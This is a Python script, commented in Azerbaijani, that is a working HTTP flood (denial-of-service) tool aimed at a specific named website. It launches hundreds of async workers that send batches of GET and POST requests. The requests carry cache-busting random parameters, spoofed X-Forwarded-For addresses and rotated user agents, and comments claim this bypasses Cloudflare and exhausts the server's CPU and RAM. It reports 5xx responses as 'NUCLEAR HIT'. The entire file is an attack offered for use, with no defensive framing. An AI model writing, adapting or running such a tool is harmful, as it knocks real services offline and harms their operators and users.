import asyncio
import httpx
import random
import string
import time

# ==========================================
# 🎯 HƏDƏFİ BURADA DƏYİŞ (TARGET CONFIG)
# ==========================================
TARGET_URL = "https://streamwin.win"
WORKERS = 800         # Railway Paid üçün maksimal asinxron tutumu
BATCH_SIZE = 120       # Bir worker-in eyni anda açdığı stream sayısı
# ==========================================

def r_str(n):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

async def fatal_strike(worker_id, client):
    while True:
        try:
            # Serveri bazadan vurmaq üçün ağır API parametrləri və cache-bypass
            # Bu, sorğunu mütləq şəkildə ANA SERVERƏ (Origin) göndərməyə məcbur edir
            url = f"{TARGET_URL}/?v={time.time()}&id={r_str(30)}&search={r_str(80)}"
            
            headers = {
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(0,6)}.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                "X-Requested-With": "XMLHttpRequest",
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Connection": "keep-alive"
            }

            # HTTP/2 MULTIPLEXING: Bir bağlantıdan minlərlə "yarımçıq" müraciət
            # Bu serverin prosessoruna "Atom Bombası" effekti verir
            tasks = []
            for _ in range(BATCH_SIZE):
                # VECTOR A: Ağır POST (Server RAM-ını kilitləmək üçün)
                if _ % 5 == 0:
                    tasks.append(client.post(url, headers=headers, content=r_str(1500)))
                # VECTOR B: Sürətli GET (Connection portlarını bağlamaq üçün)
                else: 
                    tasks.append(client.get(url, headers=headers))
            
            # Dalğanı serverin prosessoruna çırp!
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Əgər 5xx xətaları gəlməyə başlayırsa, deməli zərbə endirilir
            for r in responses:
                if hasattr(r, 'status_code') and r.status_code >= 500:
                    print(f"☢️  NUCLEAR HIT! Server Status: {r.status_code}", end="\r")

        except Exception:
            await asyncio.sleep(0.01)

async def main():
    print(f"💀 NEUTRON STAR ACTIVATED ON: {TARGET_URL}")
    print(f"[*] Power: {WORKERS} Workers | Speed: {WORKERS * BATCH_SIZE} RPS Capability")
    
    # TCP hüdudlarını və bağlantı limitlərini tamamilə ləğv edirik
    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
    
    async with httpx.AsyncClient(
        http2=True,          # Cloudflare Bypass üçün MÜTLƏQDİR
        verify=False, 
        limits=limits, 
        timeout=10.0         # Server donanda bağlantını buraxma (Slowloris)
    ) as client:
        
        workers = [fatal_strike(i, client) for i in range(WORKERS)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
